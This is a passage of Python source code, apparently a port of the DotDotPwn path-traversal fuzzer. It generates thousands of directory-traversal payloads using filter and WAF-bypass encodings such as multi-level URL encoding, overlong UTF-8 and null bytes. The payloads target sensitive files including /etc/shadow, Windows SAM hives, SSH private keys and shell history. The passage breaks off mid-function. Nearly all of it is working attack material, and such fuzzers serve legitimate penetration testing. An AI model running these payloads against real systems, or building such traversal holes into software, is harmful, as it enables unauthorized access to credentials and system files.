"""
Traversal Engine Module

This is the CORE module that resides the main functionality to make all the 
combinations between the dots, slashes and filenames to make the traversal strings.

Python implementation of the original DotDotPwn TraversalEngine.pm
Original by nitr0us (nitrousenador@gmail.com)
"""

from typing import List, Optional, Set
import itertools
from enum import Enum


class OSType(Enum):
    """Operating System types for intelligent fuzzing"""
    WINDOWS = "windows"
    UNIX = "unix"
    GENERIC = "generic"


class DetectionMethod(Enum):
    """Detection methods for targeted payload generation"""
    SIMPLE = "simple"                           # Basic traversal sequences (../../../etc/passwd)
    ABSOLUTE_PATH = "absolute_path"             # Absolute path bypass (/etc/passwd)
    NON_RECURSIVE = "non_recursive"             # Non-recursive filter bypass (....//....//....//etc/passwd)
    URL_ENCODING = "url_encoding"               # URL encoding bypass (..%252f..%252f..%252fetc/passwd)
    PATH_VALIDATION = "path_validation"         # Path validation bypass (/var/www/images/../../../etc/passwd)
    NULL_BYTE = "null_byte"                     # Null byte extension bypass (../../../etc/passwd%00.png)
    ANY = "any"                                 # All detection methods combined


class TraversalEngine:
    """
    Engine that builds traversal strings according to the depth provided and OS type.
    
    If OS detection is enabled, it includes only specific files for the detected OS.
    Also handles different representations of dots and slashes for comprehensive fuzzing.
    """

    # Specific files in Windows systems
    WINDOWS_FILES = [
        'boot.ini',
        '\\windows\\win.ini', 
        '\\windows\\system32\\drivers\\etc\\hosts'
    ]

    # Specific files in UNIX-based systems  
    UNIX_FILES = [
        '/etc/passwd',
        '/etc/issue'
    ]

    # Absolute path files for UNIX systems (direct absolute path injection)
    UNIX_ABSOLUTE_FILES = [
        '/etc/passwd',
        '/etc/shadow',
        '/etc/hosts',
        '/etc/hostname', 
        '/etc/issue',
        '/etc/motd',
        '/etc/group',
        '/etc/fstab',
        '/etc/crontab',
        '/proc/self/environ',
        '/proc/version',
        '/proc/cmdline',
        '/proc/self/stat',
        '/proc/self/status',
        '/var/log/auth.log',
        '/var/log/syslog',
        '/var/log/messages',
        '/var/log/apache/access.log',
        '/var/log/apache2/access.log',
        '/var/log/apache/error.log',
        '/var/log/apache2/error.log',
        '/var/log/nginx/access.log',
        '/var/log/nginx/error.log',
        '/var/www/html/index.html',
        '/var/www/index.html',
        '/usr/local/apache/conf/httpd.conf',
        '/usr/local/apache2/conf/httpd.conf',
        '/etc/apache2/apache2.conf',
        '/etc/apache2/sites-enabled/000-default',
        '/etc/nginx/nginx.conf',
        '/etc/nginx/sites-enabled/default',
        '/home/www-data/.bash_history',
        '/root/.bash_history',
        '/home/[user]/.bash_history',
        '/home/[user]/.ssh/id_rsa',
        '/root/.ssh/id_rsa'
    ]

    # Absolute path files for Windows systems (direct absolute path injection)
    WINDOWS_ABSOLUTE_FILES = [
        'C:\\boot.ini',
        'C:\\windows\\win.ini',
        'C:\\windows\\system.ini',
        'C:\\windows\\system32\\drivers\\etc\\hosts',
        'C:\\windows\\system32\\config\\sam',
        'C:\\windows\\system32\\config\\system',
        'C:\\windows\\system32\\config\\software',
        'C:\\windows\\system32\\config\\security',
        'C:\\windows\\repair\\sam',
        'C:\\windows\\repair\\system',
        'C:\\windows\\php.ini',
        'C:\\php\\php.ini',
        'C:\\program files\\apache group\\apache\\conf\\httpd.conf',
        'C:\\program files\\apache group\\apache2\\conf\\httpd.conf',
        'C:\\program files (x86)\\apache group\\apache\\conf\\httpd.conf',
        'C:\\apache\\conf\\httpd.conf',
        'C:\\inetpub\\wwwroot\\index.html',
        'C:\\inetpub\\wwwroot\\web.config',
        'C:\\windows\\system32\\inetsrv\\config\\applicationHost.config',
        'C:\\windows\\system32\\inetsrv\\config\\administration.config',
        'C:\\windows\\microsoft.net\\framework\\v2.0.50727\\config\\web.config',
        'C:\\windows\\microsoft.net\\framework64\\v2.0.50727\\config\\web.config',
        'C:\\users\\administrator\\desktop\\desktop.ini',
        'C:\\documents and settings\\administrator\\desktop\\desktop.ini',
        'C:\\windows\\temp\\',
        'C:\\temp\\',
        'C:\\tmp\\'
    ]

    # Extra files (only included if extra_files flag is enabled)
    EXTRA_FILES = [
        "config.inc.php",
        "web.config"
    ]

    # Dots (..) representations for fuzzing with comprehensive WAF bypass encoding
    DOTS = [
        # Basic representations
        "..",
        
        # Null byte variations - CRITICAL for file extension bypass
        ".%00.", "..%00", "..%01", "..%2500", "..%252500", "..%25252500",
        
        # Wildcard patterns  
        ".?", "??", "?.",
        
        # Basic encoding
        "%5C..", ".%2e", "%2e.",
        
        # Path manipulation
        ".../.", "..../",
        
        # Single URL encoding
        "%2e%2e",
        
        # Double URL encoding (critical for WAF bypass)
        "%252e%252e",
        
        # Triple URL encoding
        "%25252e%25252e",
        
        # Quadruple URL encoding
        "%2525252e%2525252e",
        
        # Quintuple URL encoding  
        "%252525252e%252525252e",
        
        # Alternative encoding techniques
        "%%c0%6e%c0%6e", "0x2e0x2e", "%c0.%c0.",
        
        # UTF-8 overlong encoding variations
        "%c0%2e%c0%2e", "%c0%ae%c0%ae",
        "%c0%5e%c0%5e", "%c0%ee%c0%ee",
        "%c0%fe%c0%fe", 
        
        # Unicode fullwidth variations
        "%uff0e%uff0e",
        
        # Double encoded alternatives
        "%%32%%65%%32%%65",
        
        # Invalid UTF-8 sequences
        "%e0%80%ae%e0%80%ae",
        
        # Mixed encoding with URL encoding layers
        "%25c0%25ae%25c0%25ae",
        
        # 4-byte UTF-8 overlong
        "%f0%80%80%ae%f0%80%80%ae",
        
        # 5-byte UTF-8 overlong
        "%f8%80%80%80%ae%f8%80%80%80%ae",
        
        # 6-byte UTF-8 overlong
        "%fc%80%80%80%80%ae%fc%80%80%80%80%ae",
        
        # Mixed multiple encoding combinations
        "%252e%2e",          # Double + single encoding mix
        "%25252e%252e",      # Triple + double encoding mix
        "%2e%252e",          # Single + double encoding mix
        
        # Case variation encodings
        "%2E%2E",            # Uppercase single encoding
        "%252E%252E",        # Uppercase double encoding
        "%25252E%25252E",    # Uppercase triple encoding
        
        # Hybrid encoding techniques
        "%c0%ae%252e",       # UTF-8 overlong + double URL
        "%e0%80%ae%25252e",  # Invalid UTF-8 + triple URL
        "%252e%c0%ae",       # Double URL + UTF-8 overlong
        "%25252e%e0%80%ae",  # Triple URL + invalid UTF-8
        
        # Null byte injection patterns for comprehensive bypass
        "..%00%2e", "%2e%00%2e", "%2e%2e%00",  # Null byte in different positions
        "..%c0%80", "%c0%80%c0%80",            # UTF-8 null variations
        "..%u0000", "%u0000%u0000",            # Unicode null variations
        "..%01%02", "%02%2e%01",               # Control character variations
        "..%0a%2e", "%2e%0d%2e",               # Line break character variations
    ]

    # Slashes (/ and \\) representations for fuzzing with comprehensive WAF bypass encoding
    SLASHES = [
        # Basic representations
        "/", "\\\\",
        
        # Single URL encoding
        "%2f", "%5c",
        
        # Hexadecimal representations
        "0x2f", "0x5c", 
        
        # Double URL encoding (critical for WAF bypass)
        "%252f", "%255c",
        "%252f/", "%255c\\",          # Double encoding with literal separators
        
        # Triple URL encoding (bypasses multiple decode layers)
        "%25252f", "%25255c",
        "%25252f/", "%25255c\\",      # Triple encoding with literal separators
        
        # Quadruple URL encoding (for deep decode protection)
        "%2525252f", "%2525255c",
        "%2525252f/", "%2525255c\\",  # Quadruple encoding with literal separators
        
        # Quintuple URL encoding (maximum protection bypass)
        "%252525252f", "%252525255c",
        "%252525252f/", "%252525255c\\", # Quintuple encoding with literal separators
        
        # UTF-8 overlong encoding variations
        "%c0%2f", "%c0%af", "%c0%5c", "%c1%9c", "%c1%pc",
        "%c0%9v", "%c0%qf", "%c1%8s", "%c1%1c", "%c1%af",
        
        # Unicode and special character encodings
        "%bg%qf", "%u2215", "%u2216", "%uEFC8", "%uF025",
        
        # Mixed double encoding techniques  
        "%%32%%66", "%%35%%63",
        
        # Invalid UTF-8 sequences
        "%e0%80%af",
        
        # Mixed encoding with URL encoding layers
        "%25c1%259c", "%25c0%25af", 
        
        # 4-byte UTF-8 overlong encoding
        "%f0%80%80%af",
        
        # 5-byte UTF-8 overlong encoding
        "%f8%80%80%80%af",
        
        # Mixed multiple encoding combinations (WAF confusion techniques)
        "%252f%2f",         # Double + single encoding mix
        "%25252f%252f",     # Triple + double encoding mix
        "%2f%252f",         # Single + double encoding mix
        "%5c%255c",         # Single + double backslash mix
        "%255c%25255c",     # Double + triple backslash mix
        
        # Case variation encodings
        "%2F", "%5C",       # Uppercase single encoding
        "%252F", "%255C",   # Uppercase double encoding
        "%25252F", "%25255C", # Uppercase triple encoding
        
        # Alternative slash representations with multiple encoding
        "%252e%252e%252f",  # Double encoded '../'
        "%25252e%25252e%25252f", # Triple encoded '../'
        
        # Hybrid encoding techniques
        "%c0%af%252f",      # UTF-8 overlong + double URL
        "%e0%80%af%25252f", # Invalid UTF-8 + triple URL
        "%252f%c0%af",      # Double URL + UTF-8 overlong
        "%25252f%e0%80%af", # Triple URL + invalid UTF-8
        
        # Null byte injection patterns for path separator bypass
        "/%00", "%00/", "%2f%00", "%00%2f",           # Forward slash null variations
        "\\%00", "%00\\", "%5c%00", "%00%5c",         # Backslash null variations
        "%2500%2f", "%2f%2500", "%2500%5c", "%5c%2500", # Double encoded null combinations
        "/%c0%80", "%c0%80/", "\\%c0%80", "%c0%80\\", # UTF-8 null with separators
        "/%u0000", "%u0000/", "\\%u0000", "%u0000\\", # Unicode null with separators
        
        # Control character injection with separators
        "/%01", "%01/", "/%02", "%02/",               # Control chars with forward slash
        "\\%01", "%01\\", "\\%02", "%02\\",           # Control chars with backslash
        "/%0a", "%0a/", "/%0d", "%0d/",               # Line breaks with separators
        "\\%0a", "%0a\\", "\\%0d", "%0d\\",           # Line breaks with backslash
        
        # Space injection with separators (edge cases)
        "/ ", " /", "\\ ", " \\",                     # Literal spaces
        "/%20", "%20/", "\\%20", "%20\\",             # URL encoded spaces
        "%2520%2f", "%2f%2520", "%2520%5c", "%5c%2520", # Double encoded space combinations
    ]

    # Special patterns that won't be combined in the main engine to reduce payload count
    # These include specific WAF bypass combinations and edge cases
    SPECIAL_PATTERNS = [
        # Basic traversal variations
        "..//", "..///", "..\\\\\\\\", "..\\\\\\\\\\\\", "../\\\\", "..\\\\/",
        "../\\\\/", "..\\\\/\\\\", "\\\\../", "/..\\\\", ".../", "...\\\\",
        "./../", ".\\\\..\\\\", ".//..///", ".\\\\\\\\..\\\\\\\\", "......///",
        
        # Mixed encoding special cases
        "%2e%c0%ae%5c", "%2e%c0%ae%2f",
        
        # Multiple URL encoding special patterns for WAF bypass
        "..%252f",                  # Double encoded single traversal
        "..%25252f",                # Triple encoded single traversal
        "..%2525252f",              # Quadruple encoded single traversal
        "..%252525252f",            # Quintuple encoded single traversal
        
        # Mixed encoding combinations
        "..%2f%252f",               # Single + double encoding
        "..%252f%25252f",           # Double + triple encoding
        "..%25252f%2525252f",       # Triple + quadruple encoding
        "..%2525252f%252525252f",   # Quadruple + quintuple encoding
        
        # Case variation mixed patterns
        "..%2F%252f",               # Mixed case single + double
        "..%252F%25252f",           # Mixed case double + triple
        "..%25252F%2525252f",       # Mixed case triple + quadruple
        
        # Hybrid UTF-8 + multiple URL encoding
        "..%c0%af%252f",            # UTF-8 overlong + double URL
        "..%c0%af%25252f",          # UTF-8 overlong + triple URL
        "..%e0%80%af%252f",         # Invalid UTF-8 + double URL
        "..%e0%80%af%25252f",       # Invalid UTF-8 + triple URL
        
        # Null byte with multiple encoding levels - CRITICAL for file extension bypass
        "..%00%252f", "..%2500%252f", "..%252500%25252f",     # Various null + encoded slash combinations
        "..%00%255c", "..%2500%255c", "..%252500%25255c",     # Various null + encoded backslash combinations
        "..%c0%80%252f", "..%e0%80%80%252f", "..%f0%80%80%80%252f", # UTF-8 null variations
        "..%u0000%252f", "..%01%252f", "..%02%252f",          # Alternative null/control chars
        
        # Multiple null bytes (bypass double-check filters)
        "..%00%00%2f", "..%2500%2500%252f", "..%00%2500%252f", # Double null combinations
        "..%00%01%00%2f", "..%00%20%00%2f", "..%2500%20%2500%252f", # Null with padding
        
        # Null byte injection in middle of traversal sequence
        "..%00/%2e%2e/", "..%2500/%252e%252e/", "..%252500/%25252e%25252e/", # Mid-sequence nulls
        ".%00.%2f.%00.%2f", ".%2500.%252f.%2500.%252f",      # Alternating null pattern
        
        # File extension bypass with null byte termination
        "..%00.png%2f", "..%00.jpg%252f", "..%00.pdf%25252f", # Fake extensions with null
        "..%2500.txt%252f", "..%252500.log%25252f",           # Double/triple encoded nulls
        "..%c0%80.backup%252f", "..%e0%80%80.tmp%25252f",     # UTF-8 null with extensions
        
        # Space injection with multiple encoding
        "..%20%252f",               # URL encoded space + double encoded slash
        "..%2520%25252f",           # Double encoded space + triple encoded slash
        "..%252520%2525252f",       # Triple encoded space + quadruple encoded slash
        
        # Complex encoding chains (maximum confusion)
        "..%252e%25252e%2525252f",  # Triple encoded '../'
        "..%2525252e%252525252e%252525252f", # Quintuple encoded '../'
        
        # Alternative representation with multiple encoding
        "..%253f%252f",             # Double encoded '?' + double encoded '/'
        "..%25253b%25252f",         # Triple encoded ';' + triple encoded '/'
        "..%2525233%2525252f",      # Complex encoded '#' + quintuple encoded '/'
    ]

    # Non-recursive bypass patterns - designed to bypass filters that remove '../' only once
    # These patterns exploit filters that don't recursively clean up directory traversal sequences
    NON_RECURSIVE_BYPASS_PATTERNS = [
        # Critical literal separator patterns for comprehensive WAF bypass
        "..%252f..%252f..%252f",     # Triple double-encoded - CRITICAL PATTERN
        "..%25252f..%25252f..%25252f", # Triple triple-encoded
        "..%252f..%252f",            # Double double-encoded
        
        # Core 4-dot double-slash patterns (main bypass technique)
        "....//",                   # After '../' removal becomes '../'
        ".....///",                 # 5-dot triple-slash variation
        "......////",               # 6-dot quad-slash variation
        
        # Backslash variations (Windows compatibility)
        "....\\\\",                 # 4-dot double-backslash
        ".....\\\\\\",              # 5-dot triple-backslash
        "......\\\\\\\\",           # 6-dot quad-backslash
        
        # Mixed separator patterns
        "....//..\\\\",             # Mixed forward/backward slash
        "..\\\\..//",               # Mixed backward/forward slash
        
        # Single URL encoded variations
        "....%2f%2f",               # URL encoded double slash
        "....%5c%5c",               # URL encoded double backslash
        
        # Double URL encoded variations (critical for WAF bypass)
        "....%252f%252f",           # Double URL encoded slash
        "....%252f%252f/",          # Double URL encoded slash with literal separator
        "....%255c%255c",           # Double URL encoded backslash
        "....%255c%255c\\",         # Double URL encoded backslash with literal separator
        
        # Triple URL encoded variations
        "....%25252f%25252f",       # Triple URL encoded slash
        "....%25252f%25252f/",      # Triple URL encoded slash with literal separator
        "....%25255c%25255c",       # Triple URL encoded backslash
        "....%25255c%25255c\\",     # Triple URL encoded backslash with literal separator
        
        # Quadruple URL encoded variations
        "....%2525252f%2525252f",   # Quadruple URL encoded slash
        "....%2525252f%2525252f/",  # Quadruple URL encoded slash with literal separator
        "....%2525255c%2525255c",   # Quadruple URL encoded backslash
        "....%2525255c%2525255c\\", # Quadruple URL encoded backslash with literal separator
        
        # Quintuple URL encoded variations
        "....%252525252f%252525252f", # Quintuple URL encoded slash
        "....%252525252f%252525252f/", # Quintuple URL encoded slash with literal separator
        "....%252525255c%252525255c", # Quintuple URL encoded backslash
        "....%252525255c%252525255c\\", # Quintuple URL encoded backslash with literal separator
        
        # Mixed encoding level patterns (confusion techniques)
        "....%2f%252f",             # Single + double encoding mix
        "....%252f%25252f",         # Double + triple encoding mix
        "....%25252f%2525252f",     # Triple + quadruple encoding mix
        "....%5c%255c",             # Single + double backslash mix
        "....%255c%25255c",         # Double + triple backslash mix
        
        # UTF-8 overlong encoding bypass
        "....%c0%af%c0%af",         # Overlong UTF-8 slash
        "....%c0%5c%c0%5c",         # Overlong UTF-8 backslash
        "....%e0%80%af%e0%80%af",   # Invalid UTF-8 slash sequence
        
        # Hybrid UTF-8 + URL encoding combinations
        "....%c0%af%252f",          # UTF-8 overlong + double URL
        "....%252f%c0%af",          # Double URL + UTF-8 overlong
        "....%e0%80%af%25252f",     # Invalid UTF-8 + triple URL
        "....%25252f%e0%80%af",     # Triple URL + invalid UTF-8
        
        # Null byte injection patterns with multiple encoding
        "....%00//",                # Null byte + forward slash
        "....%00\\\\",              # Null byte + backslash
        "..%00..//",                # Embedded null byte
        "....%2500%252f%252f",      # URL encoded null + double encoded slash
        "....%252500%25252f%25252f", # Double encoded null + triple encoded slash
        
        # Space injection patterns with encoding variations
        ".... //",                  # Space before slash
        "..../ /",                  # Space within slash sequence
        ".... \\\\",                # Space before backslash
        "....%20%252f%252f",        # URL encoded space + double encoded slash
        "....%2520%25252f%25252f",  # Double encoded space + triple encoded slash
        
        # Alternative representation patterns with encoding
        "....?/",                   # Question mark separator
        "....??//",                 # Double question mark
        "....;//",                  # Semicolon separator
        "....;;\\\\",               # Double semicolon with backslash
        "....#/",                   # Hash separator
        "....##//",                 # Double hash
        
        # Case variation bypass patterns
        "....%2F%2F",               # Uppercase single encoding
        "....%252F%252F",           # Uppercase double encoding
        "....%25252F%25252F",       # Uppercase triple encoding
        "....%5C%5C",               # Uppercase backslash single
        "....%255C%255C",           # Uppercase backslash double
        "....%25255C%25255C",       # Uppercase backslash triple
        
        # Double-encoded dots with multiple slash encoding
        "..%252e%252e%252f%252f",   # Double encoded '..//'
        "..%25252e%25252e%25252f%25252f", # Triple encoded '..//'
        "..%2525252e%2525252e%2525252f%2525252f", # Quadruple encoded '..//'
        
        # Complex hybrid patterns for maximum bypass coverage
        "....%252f%2f%252f",        # Mixed double and single encoding
        "....%25252f%252f%25252f",  # Mixed triple and double encoding
        "....%c0%af%252f%c0%af",    # UTF-8 + double URL interleaved
        "....%e0%80%af%25252f%e0%80%af", # Invalid UTF-8 + triple URL interleaved
    ]

    def __init__(self, quiet: bool = False):
        """Initialize the Traversal Engine"""
        self.quiet = quiet

    def generate_traversals(
        self,
        os_type: OSType = OSType.GENERIC,
        depth: int = 6,
        specific_file: Optional[str] = None,
        extra_files: bool = False,
        extension: Optional[str] = None,
        bisection_depth: Optional[int] = None,
        include_absolute: bool = True,
        detection_method: DetectionMethod = DetectionMethod.ANY
    ) -> List[str]:
        """
        Generate traversal strings based on parameters
        
        Args:
            os_type: Operating system type for intelligent fuzzing
            depth: Depth of traversals (default: 6)  
            specific_file: Specific filename to target
            extra_files: Include extra files from EXTRA_FILES
            extension: File extension to append to each fuzz string
            bisection_depth: If provided, use this depth for bisection algorithm
            include_absolute: Include direct absolute path injection patterns (default: True)
            detection_method: Specific detection method to use for payload generation
            
        Returns:
            List of traversal strings to test
        """
        if not self.quiet and detection_method != DetectionMethod.ANY:
            method_descriptions = {
                DetectionMethod.SIMPLE: "Basic directory traversal patterns",
                DetectionMethod.ABSOLUTE_PATH: "Direct absolute path injection",
                DetectionMethod.NON_RECURSIVE: "Non-recursive filter bypass patterns",
                DetectionMethod.URL_ENCODING: "Multi-level URL encoding bypass",
                DetectionMethod.PATH_VALIDATION: "Path validation bypass patterns",
                DetectionMethod.NULL_BYTE: "Null byte extension bypass patterns"
            }
            print(f"[+] Using targeted detection method: {method_descriptions[detection_method]}")
        
        # If ANY method is selected, use full generation (existing behavior)
        if detection_method == DetectionMethod.ANY:
            return self._generate_all_methods(os_type, depth, specific_file, extra_files, extension, bisection_depth, include_absolute)
        
        # Method-specific payload generation
        if detection_method == DetectionMethod.SIMPLE:
            return self._generate_simple_traversals(os_type, depth, specific_file, extra_files, extension, bisection_depth)
        elif detection_method == DetectionMethod.ABSOLUTE_PATH:
            return self._generate_absolute_path_traversals(os_type, specific_file, extra_files, extension)
        elif detection_method == DetectionMethod.NON_RECURSIVE:
            return self._generate_non_recursive_traversals(os_type, depth, specific_file, extra_files, extension, bisection_depth)
        elif detection_method == DetectionMethod.URL_ENCODING:
            return self._generate_url_encoding_traversals(os_type, depth, specific_file, extra_files, extension, bisection_depth)
        elif detection_method == DetectionMethod.PATH_VALIDATION:
            return self._generate_path_validation_traversals(os_type, depth, specific_file, extra_files, extension)
        elif detection_method == DetectionMethod.NULL_BYTE:
            return self._generate_null_byte_traversals(os_type, depth, specific_file, extra_files, extension)
        
        # This should not be reached due to the ANY check above, but for safety
        return self._generate_all_methods(os_type, depth, specific_file, extra_files, extension, bisection_depth, include_absolute)

    def _generate_all_methods(
        self,
        os_type: OSType,
        depth: int,
        specific_file: Optional[str],
        extra_files: bool,
        extension: Optional[str],
        bisection_depth: Optional[int],
        include_absolute: bool
    ) -> List[str]:
        """Generate traversals using all detection methods (original behavior)"""
        if not self.quiet:
            print("[+] Creating Traversal patterns (mix of dots and slashes)")

        # Generate base traversal patterns
        traversal_patterns = self._generate_patterns()
        
        # Generate traversal strings with repetitions
        if not self.quiet:
            if bisection_depth:
                print(f"[+] Multiplying {bisection_depth} times the traversal patterns (Bisection Algorithm enabled)")
            else:
                print(f"[+] Multiplying {depth} times the traversal patterns (-d switch)")

        max_depth = bisection_depth if bisection_depth else depth
        min_depth = bisection_depth if bisection_depth else 1
        
        traversal_strings = []
        for pattern in traversal_patterns:
            for k in range(min_depth, max_depth + 1):
                traversal_strings.append(pattern * k)

        # Add special traversal patterns
        if not self.quiet:
            print("[+] Creating the Special Traversal patterns")
            
        special_traversals = []
        for pattern in self.SPECIAL_PATTERNS:
            for k in range(min_depth, max_depth + 1):
                special_traversals.append(pattern * k)

        # Add comprehensive non-recursive bypass patterns
        if not self.quiet:
            print("[+] Creating Non-Recursive Bypass patterns for advanced filter evasion")
            
        nonrecursive_traversals = self._generate_nonrecursive_bypass_traversals(max_depth)

        # Get target files based on OS and settings
        target_files = self._get_target_files(os_type, specific_file, extra_files)
        
        # Combine traversal strings with target files
        final_traversals = []
        
        all_traversals = traversal_strings + special_traversals + nonrecursive_traversals
        
        for traversal in all_traversals:
            for target_file in target_files:
                # Generate both original and adapted file versions for comprehensive coverage
                file_variants = [target_file]
                
                # Adapt slashes based on traversal pattern for additional variant
                adapted_file = self._adapt_file_slashes(target_file, traversal)
                if adapted_file != target_file:
                    file_variants.append(adapted_file)
                
                # Create payloads for all file variants
                for file_variant in file_variants:
                    # Normalize file variant to prevent double slashes/backslashes
                    normalized_variant = self._normalize_target_file(file_variant)
                    payload = traversal + normalized_variant
                    
                    # Add extension if specified
                    if extension:
                        payload += extension
                        
                    final_traversals.append(payload)

        # Add null byte bypass patterns with file extension validation bypass
        if not bisection_depth:  # Skip in bisection mode for efficiency
            if not self.quiet:
                print("[+] Creating Null Byte Bypass patterns for file extension validation bypass")
                
            null_byte_patterns = self._generate_null_byte_bypass_patterns(
                os_type, specific_file, extra_files, extension, max_depth
            )
            final_traversals.extend(null_byte_patterns)
            
            if not self.quiet:
                print(f"[+] Added {len(null_byte_patterns)} null byte bypass patterns")

        # Add direct absolute path injection patterns
        if include_absolute and not bisection_depth:  # Skip absolute paths in bisection mode
            if not self.quiet:
                print("[+] Adding Direct Absolute Path Injection patterns")
                
            absolute_patterns = self._generate_absolute_patterns(os_type, specific_file, extra_files, extension)
            final_traversals.extend(absolute_patterns)
            
            if not self.quiet:
                print(f"[+] Added {len(absolute_patterns)} absolute path patterns")

        # Add path validation bypass patterns (legitimate prefix + traversal)
        if not bisection_depth:  # Skip in bisection mode for efficiency
            if not self.quiet:
                print("[+] Adding Path Validation Bypass patterns")
                
            path_validation_patterns = self._generate_path_validation_bypass_patterns(
                os_type, specific_file, extra_files, extension, max_depth
            )
            final_traversals.extend(path_validation_patterns)
            
            if not self.quiet:
                print(f"[+] Added {len(path_validation_patterns)} path validation bypass patterns")

        if not self.quiet:
            print(f"[+] Traversal Engine DONE! - Total traversal tests created: {len(final_traversals)}")

        return final_traversals

    def _generate_patterns(self) -> List[str]:
        """Generate base traversal patterns from dots and slashes combinations"""
        patterns = []
        for dot in self.DOTS:
            for slash in self.SLASHES:
                patterns.append(dot + slash)
        return patterns

    def _generate_nonrecursive_bypass_traversals(self, max_depth: int) -> List[str]:
        """
        Generate comprehensive non-recursive bypass traversal patterns.
        
        These patterns are specifically designed to bypass filters that only remove
        '../' sequences once (non-recursively). After the filter removes one '../',
        these patterns still contain traversal sequences that can be exploited.
        
        Examples of how they work:
        - Filter sees: ....//....//....//
        - Removes '../': ..//....//....//  
        - Result still contains '../' sequences → BYPASS SUCCESS
        
        Args:
            max_depth: Maximum depth for pattern repetition
            
        Returns:
            List of non-recursive bypass traversal patterns
        """
        traversals = []
        
        # Core non-recursive bypass patterns with exact repetition
        core_bypass_patterns = [
            # Main 4-dot double-slash technique (most effective against non-recursive filters)
            "....//....//..../",        # 3-level bypass
            "....//....//....//...../", # 4-level bypass
            "....//....//....//....//..../", # 5-level bypass
            
            # 5-dot triple-slash technique  
            ".....///.....///.....",     # 3-level
            ".....///.....///.....///.....", # 4-level
            
            # 6-dot quad-slash technique
            "......////......////.....",  # 3-level
            
            # Mixed encoding for different bypass scenarios
            "....//....%2f%2f..../",     # URL encoding mix
            "....%2f%2f....//..../",     # Reverse URL encoding mix
            "....%c0%af%c0%af....//..../", # UTF-8 overlong mix
            "....//....%c0%af%c0%af..../", # Reverse UTF-8 mix
            
            # Backslash variations (Windows compatibility)
            "....\\\\....\\\\....",      # Windows double-backslash
            "....\\\\....//..../",       # Mixed slash types
            "....//....\\\\..../",       # Mixed slash types reverse
            
            # Null byte injection patterns
            "....%00//....%00//..../",   # Classic null byte bypass
            "..%00..//..%00..//..%00..", # Embedded null bytes
            "....%00//....//..../",      # Mixed null byte
            
            # Space injection patterns (often missed by regex filters)
            ".... //.... //... /",      # Space injection
            "..../ /..../ /..../",      # Mid-slash spaces
            
            # Advanced encoding combinations
            "....%252f%252f....%252f%252f..../", # Double URL encoding
            "....%e0%80%af%e0%80%af....//..../", # Invalid UTF-8 sequences
            "....%c1%9c%c1%9c....//..../",       # Alternative UTF-8 encoding
            
            # Question mark and special character bypasses
            "....?/....?/..../",         # Question mark separators
            "....;;////....;;////..../", # Semicolon separators
            
            # High-value combination patterns
            "....//....%00//....%2f%2f..../",    # Triple technique mix
            "....%c0%af%c0%af....\\\\....//..../", # Multi-encoding mix
        ]
        
        # Add depth-limited patterns
        for depth in range(1, min(max_depth, 4) + 1):  # Limit to prevent payload explosion
            for pattern in core_bypass_patterns:
                if depth <= 3 or len(pattern) < 50:  # Size control
                    traversals.append(pattern)
        
        # Add systematic NON_RECURSIVE_BYPASS_PATTERNS with controlled repetition
        for base_pattern in self.NON_RECURSIVE_BYPASS_PATTERNS[:30]:  # Increased limit to include literal separator patterns
            # Create multi-level combinations
            if max_depth >= 3:
                three_level = f"{base_pattern}{base_pattern}{base_pattern[2:]}"  # Overlap for realism
                traversals.append(three_level)
                
            if max_depth >= 4:
                four_level = f"{base_pattern}{base_pattern}{base_pattern}{base_pattern[2:]}"
                if len(four_level) < 60:  # Size control
                    traversals.append(four_level)
        
        # Remove duplicates and empty patterns
        unique_traversals = []
        seen = set()
        for traversal in traversals:
            if traversal and traversal not in seen and len(traversal) > 5:
                unique_traversals.append(traversal)
                seen.add(traversal)
        
        return unique_traversals

    def _generate_null_byte_bypass_patterns(
        self, 
        os_type: OSType, 
        specific_file: Optional[str], 
        extra_files: bool, 
        extension: Optional[str],
        max_depth: int
    ) -> List[str]:
        """
        Generate null byte bypass patterns for file extension validation bypass
        
        These patterns exploit vulnerabilities where applications validate file extensions
        but fail to handle null bytes properly. The null byte terminates string processing
        in many languages (C, PHP, etc.), causing the application to ignore everything
        after the null byte.
        
        Examples:
        - ../../../etc/passwd%00.png (bypasses .png extension validation)
        - /var/www/images/../../../etc/passwd%00.jpg (path validation + null byte bypass)
        - ../../../windows/system32/drivers/etc/hosts%00.txt (Windows equivalent)
        
        Args:
            os_type: Operating system type for intelligent fuzzing
            specific_file: Specific filename to target
            extra_files: Include extra files from EXTRA_FILES  
            extension: File extension that may be validated
            max_depth: Maximum depth for traversal patterns
            
        Returns:
            List of null byte bypass patterns
        """
        patterns = []
        
        # Get target files
        target_files = self._get_target_files(os_type, specific_file, extra_files)
        
        # Define common file extensions that applications often validate
        common_extensions = [
            '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp', '.svg',  # Images
            '.pdf', '.doc', '.docx', '.txt', '.rtf', '.odt',           # Documents  
            '.zip', '.rar', '.tar', '.gz', '.7z',                     # Archives
            '.mp3', '.wav', '.mp4', '.avi', '.mov',                   # Media
            '.xml', '.json', '.csv', '.log',                          # Data
            '.php', '.jsp', '.asp', '.aspx', '.js', '.html',          # Code (sometimes allowed)
        ]
        
        # If extension is provided, prioritize it but also test common ones
        if extension:
            if not extension.startswith('.'):
                extension = '.' + extension
            test_extensions = [extension] + [ext for ext in common_extensions if ext != extension]
        else:
            test_extensions = common_extensions
        
        # Null byte representations with comprehensive encoding coverage
        null_byte_encodings = [
            '%00',           # Standard URL encoding
            '%2500',         # Double URL encoding  
            '%252500',       # Triple URL encoding
            '%25252500',     # Quadruple URL encoding
            '%2525252500',   # Quintuple URL encoding
            '\x00',          # Literal null byte (raw)
            '%u0000',        # Unicode encoding
            '%c0%80',        # UTF-8 overlong encoding
            '%e0%80%80',     # Invalid UTF-8 3-byte sequence
            '%f0%80%80%80',  # Invalid UTF-8 4-byte sequence
            '\0',            # Alternative null representation
            '%01',           # Control character (sometimes works)
            '%02',           # STX control character
            '%03',           # ETX control character
            '%0a',           # Line feed (sometimes terminates)
            '%0d',           # Carriage return (sometimes terminates)
            '%09',           # Tab character (edge case)
            '%20%00',        # Space + null byte
            '%00%20',        # Null byte + space
        ]
        
        # Generate basic traversal patterns for null byte injection
        base_traversal_patterns = []
        
        # Standard traversal patterns
        for depth in range(1, max_depth + 1):
            base_traversal_patterns.extend([
                '../' * depth,
                '..\\'  * depth,
                '%2e%2e%2f' * depth,       # URL encoded
                '%2e%2e%5c' * depth,       # URL encoded backslash
                '%252e%252e%252f' * depth, # Double URL encoded
                '%252e%252e%255c' * depth, # Double URL encoded backslash
            ])
        
        # Add non-recursive bypass patterns
